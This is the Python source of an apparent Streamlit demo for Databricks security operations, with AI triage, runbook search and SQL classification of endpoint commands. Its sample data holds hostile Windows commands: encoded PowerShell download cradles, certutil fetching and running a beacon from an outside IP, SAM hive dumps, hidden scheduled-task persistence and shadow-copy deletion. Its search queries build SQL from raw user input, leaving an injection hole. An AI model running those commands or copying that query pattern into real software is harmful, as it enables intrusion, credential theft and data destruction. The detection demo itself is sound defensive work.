"""
SecOps Operator View - Databricks Apps (Streamlit)
A unified security operations dashboard demonstrating Databricks as a
smart routing layer, cold-storage search engine, and AI-powered triage platform.
"""

import os
import streamlit as st
import pandas as pd
from databricks.sdk import WorkspaceClient
from databricks.sdk.service.sql import StatementState

# ---------------------------------------------------------------------------
# Config — see DEPLOY.md to change for your workspace
# ---------------------------------------------------------------------------
CATALOG = os.environ.get("SECOPS_CATALOG", "lr_serverless_aws_us_catalog")
SCHEMA = "secops_demo"
WAREHOUSE_ID = os.environ.get("DATABRICKS_WAREHOUSE_ID", "ab79eced8207d29b")
LLM_ENDPOINT = os.environ.get("SECOPS_LLM_ENDPOINT", "databricks-meta-llama-3-3-70b-instruct")
VS_ENDPOINT = os.environ.get("SECOPS_VS_ENDPOINT", "ka-04bfe483-vs-endpoint")
VS_INDEX = f"{CATALOG}.{SCHEMA}.soc_runbook_vs_index"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

@st.cache_resource
def get_workspace_client():
    return WorkspaceClient()


def run_sql(query: str) -> pd.DataFrame:
    """Execute SQL against the serverless warehouse and return a DataFrame."""
    w = get_workspace_client()
    resp = w.statement_execution.execute_statement(
        warehouse_id=WAREHOUSE_ID,
        statement=query,
        wait_timeout="50s",
    )
    if resp.status.state != StatementState.SUCCEEDED:
        err = resp.status.error
        msg = err.message if err and err.message else "Query timed out or failed"
        st.warning(f"Query did not return results: {msg}")
        return pd.DataFrame()
    cols = [c.name for c in resp.manifest.schema.columns]
    rows = resp.result.data_array if resp.result and resp.result.data_array else []
    return pd.DataFrame(rows, columns=cols)


def call_llm(prompt: str) -> str:
    """Call Databricks Foundation Model API for AI triage."""
    w = get_workspace_client()
    try:
        from databricks.sdk.service.serving import ChatMessage, ChatMessageRole
        resp = w.serving_endpoints.query(
            name=LLM_ENDPOINT,
            messages=[
                ChatMessage(
                    role=ChatMessageRole.SYSTEM,
                    content="You are a senior SOC analyst. Analyze firewall logs and produce concise threat triage summaries. Be specific about IPs, ports, timing patterns, and recommended actions."
                ),
                ChatMessage(
                    role=ChatMessageRole.USER,
                    content=prompt
                ),
            ],
            max_tokens=1024,
            temperature=0.1,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"LLM Error: {str(e)}"


def search_runbook(query: str, num_results: int = 3) -> str:
    """Search the SOC Runbook via Vector Search and return relevant sections."""
    w = get_workspace_client()
    try:
        results = w.vector_search_indexes.query_index(
            index_name=VS_INDEX,
            columns=["section_id", "title", "content"],
            query_text=query,
            num_results=num_results,
        )
        sections = []
        for row in results.result.data_array:
            sections.append(f"**[Section {row[0]}] {row[1]}**\n{row[2]}")
        return "\n\n---\n\n".join(sections) if sections else ""
    except Exception as e:
        return f"Runbook search unavailable: {str(e)}"


def generate_remediation(ip: str, threat_types: str, triage_summary: str) -> str:
    """Generate actionable remediation payloads for SOAR and firewall."""
    w = get_workspace_client()
    try:
        from databricks.sdk.service.serving import ChatMessage, ChatMessageRole
        resp = w.serving_endpoints.query(
            name=LLM_ENDPOINT,
            messages=[
                ChatMessage(
                    role=ChatMessageRole.SYSTEM,
                    content="You are a security automation engineer. Generate exact, copy-paste-ready remediation commands. Be precise with syntax — these will be executed directly."
                ),
                ChatMessage(
                    role=ChatMessageRole.USER,
                    content=f"""Based on this threat triage for IP {ip} (threat types: {threat_types}):

{triage_summary}

Generate the following remediation payloads:

1. **Palo Alto Firewall CLI** — exact commands to block this IP on the perimeter firewall
2. **Google SecOps SOAR Webhook** — the exact JSON payload to POST to the SOAR webhook to trigger automated response
3. **CrowdStrike Host Isolation** — the command to isolate any endpoint that communicated with this IP
4. **DNS Sinkhole** — commands to add any associated domains to the DNS sinkhole

Format each as a fenced code block with the appropriate language tag. Include comments explaining each step."""
                ),
            ],
            max_tokens=1500,
            temperature=0.1,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"Remediation generation error: {str(e)}"


# ---------------------------------------------------------------------------
# Page Config
# ---------------------------------------------------------------------------
st.set_page_config(
    page_title="SecOps Operator View",
    page_icon="🛡️",
    layout="wide",
)

st.title("SecOps Operator View")
st.caption("Databricks Security Data Lakehouse — Single Source of Truth | Smart Forwarding | AI Triage")

tab_about, tab_metrics, tab_hunt, tab_triage, tab_ai_sql, tab_runbook, tab_posture = st.tabs([
    "About",
    "Metrics Dashboard",
    "Threat Hunt Search",
    "AI Triage Agent",
    "AI SQL Classification",
    "SOC Runbook (RAG)",
    "System Posture",
])

# ===========================================================================
# TAB 0: About This Demo
# ===========================================================================
with tab_about:
    st.header("About This Demo")
    st.markdown("""
This application is not a Databricks product — it is a working demonstration of what
can be built on the Databricks platform. All processes shown here are real and running:
the data pipelines, smart routing, AI-powered triage, and remediation workflows all
execute on Databricks infrastructure using **Declarative Pipelines**, **Unity Catalog**,
**Foundation Model APIs**, **Vector Search**, and **Databricks Apps**.

The data is synthetic. The firewall logs, SOC runbook procedures, and AI agent prompts
are illustrative and should not be relied upon for actual security operations.

The source code is available on [GitHub](https://github.com/wryszka/secops_demo)
and can be deployed to any Databricks workspace. It is provided as-is for demonstration
and learning purposes — not for production use.
""")

    st.divider()

    st.subheader("What You'll See")
    col1, col2 = st.columns(2)
    with col1:
        st.markdown("""
- **Metrics Dashboard** — All 35TB lives in Databricks. Only 5% forwarded to Google SecOps.
- **Threat Hunt Search** — Instant search across 100% of your data, including the 95% you'd never put in Chronicle.
- **AI Triage Agent** — Foundation Model API + RAG runbook analysis + remediation payloads.
""")
    with col2:
        st.markdown("""
- **AI SQL Classification** — `ai_query()` classifies endpoint commands as MALICIOUS/BENIGN directly inside SQL. No Python needed.
- **SOC Runbook (RAG)** — Search your incident response procedures using natural language via Vector Search.
- **System Posture** — Workspace audit dashboards from Databricks system tables.
""")

    st.divider()

    st.markdown("**Databricks services demonstrated:** Declarative Pipelines (DLT), "
                "Auto Loader, Unity Catalog, Serverless SQL, Foundation Model APIs, "
                "Vector Search, Databricks Apps")

    st.markdown("")
    if st.button("OK — Start the Demo", type="primary", use_container_width=True):
        st.query_params["tab"] = "metrics"
        st.rerun()


# ===========================================================================
# TAB 1: Metrics Dashboard
# ===========================================================================
with tab_metrics:
    st.header("Data Routing Metrics")
    st.markdown(
        "**All 35TB of logs live in Databricks** as the single source of truth — fully searchable, "
        "AI-ready, governed by Unity Catalog. The DLT Smart Router classifies each event in real time: "
        "**95% is noise** (ALLOW) that stays in cheap Delta Lake storage. **Only the 5% that needs "
        "active response** (DENY/THREAT) gets forwarded to Google SecOps for SOAR orchestration. "
        "You stop paying Chronicle to store data you can query faster and cheaper here."
    )
    with st.expander("Behind the scenes"):
        st.markdown(
            "Raw JSON firewall logs land in a **Unity Catalog Volume**. A **Declarative Pipeline (DLT)** "
            "reads them via **Auto Loader**, infers schema automatically, and classifies each event into "
            "two Delta tables based on the `action` field. All data stays in the lakehouse. Only the "
            "`high_value_siem_feed` would be forwarded to Google SecOps via a connector. The metrics below "
            "are live **Serverless SQL** queries — no pre-aggregation, no caching."
        )

    col1, col2, col3 = st.columns(3)

    df_archive = run_sql(f"SELECT COUNT(*) as cnt FROM {CATALOG}.{SCHEMA}.low_cost_archive")
    df_siem = run_sql(f"SELECT COUNT(*) as cnt FROM {CATALOG}.{SCHEMA}.high_value_siem_feed")
    df_raw = run_sql(f"SELECT COUNT(*) as cnt FROM {CATALOG}.{SCHEMA}.raw_firewall_logs")

    archive_count = int(df_archive["cnt"].iloc[0]) if not df_archive.empty else 0
    siem_count = int(df_siem["cnt"].iloc[0]) if not df_siem.empty else 0
    raw_count = int(df_raw["cnt"].iloc[0]) if not df_raw.empty else 0

    with col1:
        st.metric("All Logs in Databricks", f"{raw_count:,}", help="100% of traffic — single source of truth")
    with col2:
        st.metric("Stays in Lakehouse (ALLOW)", f"{archive_count:,}", help="95% — searchable at Delta Lake pricing")
    with col3:
        st.metric("Forwarded to Google SecOps", f"{siem_count:,}", help="Only 5% — the alerts that need SOAR action")

    st.divider()
    st.subheader("Cost Comparison")
    st.markdown("**Today:** All 35TB goes to Chronicle at hot-tier pricing. "
                "**With Databricks:** All 35TB in Delta Lake + only 1.75TB forwarded to Chronicle for SOAR.")
    col_a, col_b, col_c = st.columns(3)

    total_tb = 35
    pct_archive = archive_count / max(raw_count, 1)
    pct_siem = siem_count / max(raw_count, 1)

    chronicle_cost = total_tb * 1000 * 15  # all 35TB at $15/GB
    dbx_storage = total_tb * 1000 * 0.023  # all 35TB in Delta Lake
    chronicle_forward = total_tb * 1000 * pct_siem * 15  # only 5% forwarded to Chronicle
    dbx_total = dbx_storage + chronicle_forward

    with col_a:
        st.metric("Today: All in Chronicle", f"${chronicle_cost:,.0f}/mo",
                  help="All 35TB at $15/GB/mo hot-tier SIEM pricing")
    with col_b:
        st.metric("With Databricks", f"${dbx_total:,.0f}/mo",
                  help=f"35TB in Delta Lake (${dbx_storage:,.0f}) + {pct_siem*100:.0f}% forwarded to Chronicle (${chronicle_forward:,.0f})")
    with col_c:
        savings = chronicle_cost - dbx_total
        st.metric("Monthly Savings", f"${savings:,.0f}/mo",
                  delta=f"{savings/max(chronicle_cost,1)*100:.0f}% reduction")

    st.divider()
    st.subheader("Traffic Routing Breakdown")
    df_breakdown = run_sql(f"""
        SELECT action, COUNT(*) as event_count
        FROM {CATALOG}.{SCHEMA}.raw_firewall_logs
        GROUP BY action ORDER BY event_count DESC
    """)
    if not df_breakdown.empty:
        df_breakdown["event_count"] = df_breakdown["event_count"].astype(int)
        st.bar_chart(df_breakdown.set_index("action"))

    st.subheader("Threat Events Timeline")
    df_timeline = run_sql(f"""
        SELECT date_trunc('minute', timestamp) as minute, action, COUNT(*) as cnt
        FROM {CATALOG}.{SCHEMA}.high_value_siem_feed
        GROUP BY 1, 2 ORDER BY 1
    """)
    if not df_timeline.empty:
        df_timeline["cnt"] = df_timeline["cnt"].astype(int)
        pivot = df_timeline.pivot(index="minute", columns="action", values="cnt").fillna(0)
        st.line_chart(pivot)


# ===========================================================================
# TAB 2: Threat Hunt Search
# ===========================================================================
with tab_hunt:
    st.header("Threat Hunt — Search All Your Data")
    st.markdown(
        "An analyst received a tip about suspicious activity. Because **all 35TB lives in Databricks**, "
        "they can search 100% of traffic instantly — including the 95% you'd never pay to put in Chronicle. "
        "No data was moved or copied. Serverless SQL queries Delta Lake directly."
    )
    st.markdown(
        "**Try these searches:** IP `10.0.43.167` to trace a host | "
        "Port `53` to find DNS traffic | Port `443` for HTTPS | Protocol `ICMP` for ping sweeps | "
        "Firewall `fw-dmz-01` to audit the DMZ | Zone `GUEST` for guest network activity"
    )
    with st.expander("Behind the scenes"):
        st.markdown(
            "All firewall events live in **Delta Lake** as the single source of truth. The `low_cost_archive` "
            "holds the 95% ALLOW traffic — data that would never justify Chronicle's hot-tier pricing but is "
            "still fully searchable here. A **Serverless SQL Warehouse** executes the query on demand. "
            "Delta's columnar format makes full-table scans fast even at terabyte scale. "
            "This is data you *already have* — Databricks just makes it useful."
        )

    col_search, col_field = st.columns([3, 1])
    with col_field:
        search_field = st.selectbox("Search by:", [
            "IP Address",
            "Destination Port",
            "Protocol",
            "Firewall",
            "Source Zone",
        ])
    with col_search:
        defaults = {
            "IP Address": "10.0.43.167",
            "Destination Port": "53",
            "Protocol": "TCP",
            "Firewall": "fw-edge-01",
            "Source Zone": "TRUST",
        }
        hints = {
            "IP Address": "Try: 10.0.43.167, 10.0.3.104, or 10.0.23.135",
            "Destination Port": "Try: 53 (DNS), 443 (HTTPS), 80 (HTTP), 636 (LDAPS)",
            "Protocol": "Try: TCP, UDP, ICMP",
            "Firewall": "Try: fw-edge-01, fw-edge-02, fw-core-01, fw-dmz-01",
            "Source Zone": "Try: TRUST, DMZ, GUEST",
        }
        search_val = st.text_input(
            f"Enter {search_field.lower()} to search:",
            value=defaults[search_field],
            help=hints[search_field],
        )

    if search_val:
        field_map = {
            "IP Address": f"src_ip = '{search_val}' OR dst_ip = '{search_val}'",
            "Destination Port": f"dst_port = {search_val}",
            "Protocol": f"protocol = '{search_val.upper()}'",
            "Firewall": f"firewall = '{search_val}'",
            "Source Zone": f"src_zone = '{search_val.upper()}'",
        }
        where = field_map[search_field]

        st.info(f"Searching `{CATALOG}.{SCHEMA}.low_cost_archive` — **{search_field}**: `{search_val}`")
        df_results = run_sql(f"""
            SELECT timestamp, src_ip, dst_ip, src_port, dst_port,
                   protocol, action, bytes_sent, bytes_recv,
                   firewall, src_zone, dst_zone
            FROM {CATALOG}.{SCHEMA}.low_cost_archive
            WHERE {where}
            ORDER BY timestamp DESC
            LIMIT 200
        """)
        if not df_results.empty:
            st.success(f"Found **{len(df_results)}** records (showing up to 200)")
            st.dataframe(df_results, use_container_width=True, height=400)

            c1, c2, c3, c4 = st.columns(4)
            with c1:
                st.metric("Unique Source IPs", df_results["src_ip"].nunique())
            with c2:
                st.metric("Unique Dest Ports", df_results["dst_port"].nunique())
            with c3:
                st.metric("Total Bytes Sent", f"{df_results['bytes_sent'].astype(int).sum():,}")
            with c4:
                st.metric("Protocols", df_results["protocol"].nunique())
        else:
            st.warning(f"No records found for {search_field.lower()} `{search_val}` in the archive.")


# ===========================================================================
# TAB 3: AI Triage Agent (with RAG Runbook + Remediation)
# ===========================================================================
with tab_triage:
    st.header("AI Triage Agent")
    st.markdown(
        "The SOC team gets hundreds of DENY/THREAT alerts daily. This agent picks a "
        "flagged IP, pulls its logs, searches the **SOC Runbook** via Vector Search (RAG), "
        "and generates a triage summary grounded in company policy — plus copy-paste "
        "remediation commands for Palo Alto, SOAR, and CrowdStrike."
    )
    with st.expander("Behind the scenes"):
        st.markdown(
            "Three Databricks services work together here: **Serverless SQL** pulls the threat logs from "
            "the `high_value_siem_feed` Delta table. **Vector Search** queries a RAG index built from the "
            "SOC Runbook (10 sections, embedded with GTE-Large) to find relevant incident response procedures. "
            "The **Foundation Model API** (Llama 3.3 70B) receives both the logs and the runbook context to "
            "produce a grounded triage summary. The remediation button makes a second LLM call to generate "
            "vendor-specific commands. All of this runs inside the Databricks environment — no data leaves."
        )

    df_threat_ips = run_sql(f"""
        SELECT src_ip, COUNT(*) as event_count,
               COLLECT_SET(threat_type) as threat_types,
               COLLECT_SET(action) as actions
        FROM {CATALOG}.{SCHEMA}.high_value_siem_feed
        GROUP BY src_ip
        ORDER BY event_count DESC
        LIMIT 25
    """)

    if not df_threat_ips.empty:
        st.dataframe(df_threat_ips, use_container_width=True)

        ip_options = df_threat_ips["src_ip"].tolist()
        selected_ip = st.selectbox("Select an IP to triage:", ip_options)

        if st.button("Run AI Triage", type="primary"):
            with st.spinner("Fetching logs and running AI analysis..."):
                df_ip_logs = run_sql(f"""
                    SELECT timestamp, src_ip, dst_ip, dst_port, protocol,
                           action, threat_type, severity, bytes_sent, bytes_recv,
                           session_duration_ms, firewall
                    FROM {CATALOG}.{SCHEMA}.high_value_siem_feed
                    WHERE src_ip = '{selected_ip}'
                    ORDER BY timestamp
                    LIMIT 100
                """)

                if not df_ip_logs.empty:
                    st.subheader("Raw Logs")
                    st.dataframe(df_ip_logs, use_container_width=True, height=250)

                    threat_types_str = ", ".join(
                        df_ip_logs["threat_type"].dropna().unique().tolist()
                    )

                    runbook_context = ""
                    with st.spinner("Searching SOC Runbook..."):
                        search_query = f"{threat_types_str} {selected_ip} response procedure"
                        runbook_context = search_runbook(search_query)

                    log_summary = df_ip_logs.to_string(index=False, max_rows=50)

                    runbook_section = ""
                    if runbook_context and "unavailable" not in runbook_context.lower():
                        runbook_section = f"""

RELEVANT SOC RUNBOOK SECTIONS (use these to ground your recommendations):
{runbook_context}
"""

                    prompt = f"""Analyze these firewall logs for source IP {selected_ip} and produce a Threat Triage Summary.

LOGS:
{log_summary}
{runbook_section}
Provide:
1. **Executive Summary** — one paragraph overview of the threat
2. **Key Indicators** — specific IPs, ports, timing patterns, threat types observed
3. **Attack Classification** — what type of attack this appears to be (e.g., reconnaissance, brute force, C2, exfiltration)
4. **Risk Level** — LOW / MEDIUM / HIGH / CRITICAL with justification
5. **Recommended Actions** — specific steps the SOC team should take immediately
6. **SOC Runbook Guidance** — cite the specific runbook sections that apply and quote the relevant procedures
"""
                    triage = call_llm(prompt)

                    st.subheader("AI Threat Triage Summary")
                    st.markdown(triage)

                    if runbook_context and "unavailable" not in runbook_context.lower():
                        with st.expander("SOC Runbook Sections Retrieved (RAG)"):
                            st.markdown(runbook_context)

                    st.session_state["last_triage"] = triage
                    st.session_state["last_triage_ip"] = selected_ip
                    st.session_state["last_threat_types"] = threat_types_str
                else:
                    st.warning("No logs found for this IP.")

        if st.session_state.get("last_triage"):
            st.divider()
            st.subheader("Remediation Actions")
            st.markdown(f"Generate copy-paste-ready remediation for **{st.session_state['last_triage_ip']}**")

            if st.button("Generate Remediation", type="secondary"):
                with st.spinner("Generating remediation payloads..."):
                    remediation = generate_remediation(
                        ip=st.session_state["last_triage_ip"],
                        threat_types=st.session_state["last_threat_types"],
                        triage_summary=st.session_state["last_triage"],
                    )
                    st.markdown(remediation)
    else:
        st.info("No threat data available yet. Run the log generator and DLT pipeline first.")


# ===========================================================================
# TAB 4: AI SQL Classification (ai_query)
# ===========================================================================
with tab_ai_sql:
    st.header("AI SQL Classification — `ai_query()`")
    st.markdown(
        "An analyst who knows SQL can classify endpoint commands as **MALICIOUS** or **BENIGN** "
        "at scale — no Python, no API keys, no external services. The Foundation Model runs "
        "inside a standard `SELECT` statement using Databricks `ai_query()`."
    )
    with st.expander("Behind the scenes"):
        st.markdown(
            "The `ai_query()` function is a built-in SQL function that calls a **Foundation Model API** "
            "endpoint directly from a SQL query. The model runs inside the Databricks environment. "
            "Each row is sent to the model, classified, and the result is returned as a column — "
            "just like any other SQL function. This works on any **Serverless SQL Warehouse**."
        )

    # Check if endpoint_logs table exists
    df_check = run_sql(f"""
        SELECT COUNT(*) as cnt
        FROM {CATALOG}.{SCHEMA}.endpoint_logs
    """)

    if df_check.empty or int(df_check["cnt"].iloc[0]) == 0:
        st.warning("The `endpoint_logs` table hasn't been created yet. "
                   "Run the `03_ai_query_sql` notebook first to create it, "
                   "or click below to create it now.")
        if st.button("Create Endpoint Logs Table", type="primary"):
            with st.spinner("Creating endpoint_logs table..."):
                run_sql(f"""
                    CREATE OR REPLACE TABLE {CATALOG}.{SCHEMA}.endpoint_logs AS
                    SELECT * FROM VALUES
                      ('EP-1001', 'workstation-042', 'jsmith', 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1MC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=', '2024-03-15T09:23:41Z', 'CRITICAL'),
                      ('EP-1002', 'dc-primary', 'admin', 'cmd.exe /c whoami /all && net group "Domain Admins" /domain && nltest /dclist:', '2024-03-15T09:24:02Z', 'HIGH'),
                      ('EP-1003', 'workstation-107', 'mjones', 'outlook.exe', '2024-03-15T09:24:15Z', 'INFO'),
                      ('EP-1004', 'server-web-03', 'svc_iis', 'certutil.exe -urlcache -split -f http://45.155.205.233/beacon.exe C:\\Windows\\Temp\\svchost.exe && C:\\Windows\\Temp\\svchost.exe', '2024-03-15T09:25:33Z', 'CRITICAL'),
                      ('EP-1005', 'workstation-042', 'jsmith', 'chrome.exe --new-tab https://mail.google.com', '2024-03-15T09:26:01Z', 'INFO'),
                      ('EP-1006', 'server-db-01', 'svc_sql', 'reg.exe save HKLM\\SAM C:\\temp\\sam.save && reg.exe save HKLM\\SYSTEM C:\\temp\\sys.save', '2024-03-15T09:27:44Z', 'CRITICAL'),
                      ('EP-1007', 'workstation-089', 'analyst2', 'python3 /opt/tools/scan_report.py --output pdf', '2024-03-15T09:28:00Z', 'INFO'),
                      ('EP-1008', 'server-web-03', 'svc_iis', 'powershell.exe -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString(''http://89.248.167.131:8080/shell.ps1'')"', '2024-03-15T09:29:12Z', 'CRITICAL'),
                      ('EP-1009', 'workstation-023', 'tchen', 'notepad.exe C:\\Users\\tchen\\Documents\\meeting_notes.txt', '2024-03-15T09:30:00Z', 'INFO'),
                      ('EP-1010', 'dc-primary', 'admin', 'schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "powershell -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgTgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADAALgA1AC4AMgAyACcALAA0ADQANAA0ACkA"', '2024-03-15T09:31:55Z', 'CRITICAL'),
                      ('EP-1011', 'workstation-107', 'mjones', 'teams.exe', '2024-03-15T09:32:10Z', 'INFO'),
                      ('EP-1012', 'server-file-01', 'svc_backup', 'vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete', '2024-03-15T09:33:28Z', 'CRITICAL')
                    AS t(endpoint_id, hostname, username, raw_command, event_time, alert_level)
                """)
                st.rerun()
    else:
        st.subheader("Endpoint Logs")
        df_logs = run_sql(f"""
            SELECT endpoint_id, hostname, username, alert_level,
                   LEFT(raw_command, 80) as command_preview
            FROM {CATALOG}.{SCHEMA}.endpoint_logs
            ORDER BY event_time
        """)
        if not df_logs.empty:
            st.dataframe(df_logs, use_container_width=True)

        st.divider()
        st.subheader("AI Verdict — One-Word Classification")
        st.markdown("Each command is sent to the Foundation Model inside a SQL `SELECT`. "
                    "The model returns **MALICIOUS** or **BENIGN** as a column value.")
        if st.button("Run ai_query() Classification", type="primary"):
            with st.spinner("Running Foundation Model on each row via ai_query()..."):
                df_verdict = run_sql(f"""
                    SELECT
                      endpoint_id, hostname, username,
                      LEFT(raw_command, 60) as command_preview,
                      ai_query(
                        '{LLM_ENDPOINT}',
                        'You are a malware analyst. Analyze this command line from an endpoint log. '
                        || 'Return ONLY one word: MALICIOUS or BENIGN. '
                        || 'Command: ' || raw_command
                      ) as ai_verdict
                    FROM {CATALOG}.{SCHEMA}.endpoint_logs
                    ORDER BY event_time
                """)
                if not df_verdict.empty:
                    st.dataframe(df_verdict, use_container_width=True)

        st.divider()
        st.subheader("Deep Analysis — MITRE ATT&CK Classification")
        st.markdown("Same SQL pattern, but now the model explains *what* the attack is doing.")
        if st.button("Run MITRE ATT&CK Analysis", type="secondary"):
            with st.spinner("Running deep analysis on CRITICAL/HIGH alerts..."):
                df_mitre = run_sql(f"""
                    SELECT
                      endpoint_id, hostname, raw_command,
                      ai_query(
                        '{LLM_ENDPOINT}',
                        'You are a senior threat analyst. Analyze this command from an endpoint log. '
                        || 'In exactly 2 sentences: (1) classify as MALICIOUS or BENIGN, '
                        || '(2) if malicious, name the MITRE ATT&CK technique. '
                        || 'Command: ' || raw_command
                      ) as ai_analysis
                    FROM {CATALOG}.{SCHEMA}.endpoint_logs
                    WHERE alert_level IN ('CRITICAL', 'HIGH')
                    ORDER BY event_time
                """)
                if not df_mitre.empty:
                    for _, row in df_mitre.iterrows():
                        with st.container():
                            st.markdown(f"**{row['endpoint_id']}** — `{row['hostname']}`")
                            st.code(row["raw_command"], language="shell")
                            st.markdown(row["ai_analysis"])
                            st.divider()


# ===========================================================================
# TAB 5: SOC Runbook (RAG)
# ===========================================================================
with tab_runbook:
    st.header("SOC Runbook — Natural Language Search")
    st.markdown(
        "Your incident response procedures live in a **Vector Search index** with managed embeddings. "
        "Ask a question in plain English and the system retrieves the most relevant runbook sections — "
        "the same retrieval that powers the AI Triage Agent's grounded recommendations."
    )
    with st.expander("Behind the scenes"):
        st.markdown(
            "The SOC Runbook (10 sections covering brute force, C2, exfiltration, lateral movement, etc.) "
            "is stored in a **Delta table**. A **Vector Search** index with **managed embeddings** (GTE-Large) "
            "automatically vectorizes each section. When you search, your query is embedded by the same model "
            "and matched against the runbook via cosine similarity. No manual embedding code needed."
        )

    runbook_query = st.text_input(
        "Ask a question about incident response:",
        placeholder="e.g., What do I do if I detect SSH brute force?",
        help="Try: 'lateral movement response', 'data exfiltration GDPR', 'how to block an IP on Palo Alto', 'evidence preservation'"
    )

    if runbook_query:
        with st.spinner("Searching runbook via Vector Search..."):
            results = search_runbook(runbook_query, num_results=3)
            if results and "unavailable" not in results.lower():
                st.markdown(results)
            else:
                st.warning("No results found. Try a different query.")

    st.divider()
    st.subheader("Full Runbook Index")
    st.markdown("All sections stored in the Vector Search index:")
    df_runbook = run_sql(f"""
        SELECT section_id, title
        FROM {CATALOG}.{SCHEMA}.soc_runbook_chunks
        ORDER BY section_id
    """)
    if not df_runbook.empty:
        st.dataframe(df_runbook, use_container_width=True, hide_index=True)


# ===========================================================================
# TAB 6: System Posture
# ===========================================================================
with tab_posture:
    st.header("Workspace Security Posture")
    st.markdown(
        "Databricks provides `system.access.audit` out of the box — every login, API call, "
        "and data access is logged automatically. No additional agents or configuration needed."
    )
    with st.expander("Behind the scenes"):
        st.markdown(
            "The `system.access.audit` table is a **system table** maintained by Databricks automatically "
            "in every workspace. It records every API call, login, query, and data access event. The queries "
            "below run via **Serverless SQL** against this table directly — no ETL, no agents to install, "
            "no additional cost. This is the same data you'd pipe into a SIEM, but it's already in the lakehouse."
        )
    st.info("Audit log queries may take 30-60 seconds on first load as the warehouse warms up "
            "against the system tables. Subsequent queries are faster.")

    if st.button("Load Audit Data", type="primary"):
        with st.spinner("Querying system.access.audit (this may take a moment)..."):
            st.subheader("Recent Activity by Service")
            df_services = run_sql("""
                SELECT service_name, COUNT(*) as event_count
                FROM system.access.audit
                WHERE event_date >= CURRENT_DATE()
                GROUP BY service_name
                ORDER BY event_count DESC
                LIMIT 15
            """)
            if not df_services.empty:
                df_services["event_count"] = df_services["event_count"].astype(int)
                st.bar_chart(df_services.set_index("service_name"))

            st.subheader("Top Actions Today")
            df_actions = run_sql("""
                SELECT action_name, COUNT(*) as cnt
                FROM system.access.audit
                WHERE event_date >= CURRENT_DATE()
                GROUP BY action_name
                ORDER BY cnt DESC
                LIMIT 15
            """)
            if not df_actions.empty:
                df_actions["cnt"] = df_actions["cnt"].astype(int)
                st.dataframe(df_actions, use_container_width=True)

            st.subheader("Active Users Today")
            df_users = run_sql("""
                SELECT user_identity.email as user_email,
                       COUNT(*) as actions
                FROM system.access.audit
                WHERE event_date >= CURRENT_DATE()
                GROUP BY user_identity.email
                ORDER BY actions DESC
                LIMIT 10
            """)
            if not df_users.empty:
                df_users["actions"] = df_users["actions"].astype(int)
                st.dataframe(df_users, use_container_width=True)

# ---------------------------------------------------------------------------
# Sidebar
# ---------------------------------------------------------------------------
with st.sidebar:
    st.title("SecOps Demo")
    st.markdown("---")
    st.markdown(f"**Catalog:** `{CATALOG}`")
    st.markdown(f"**Schema:** `{SCHEMA}`")
    st.markdown("**Warehouse:** Serverless SQL")
    st.markdown(f"**LLM:** `{LLM_ENDPOINT}`")
    st.markdown("---")
    st.markdown("**Architecture:**")
    st.markdown("""
    1. **All logs** land in UC Volume
    2. DLT Auto Loader ingests continuously
    3. Smart Router classifies traffic:
       - 95% ALLOW stays in Delta Lake
       - 5% DENY/THREAT forwarded to Google SecOps
    4. 100% searchable via Serverless SQL
    5. Foundation Model API powers AI triage
    6. Vector Search grounds in SOC Runbook
    """)
    st.markdown("---")
    st.caption("This is a demo, not a Databricks product. "
               "Data is synthetic. Provided as-is for "
               "demonstration purposes. "
               "[Source code](https://github.com/wryszka/secops_demo)")
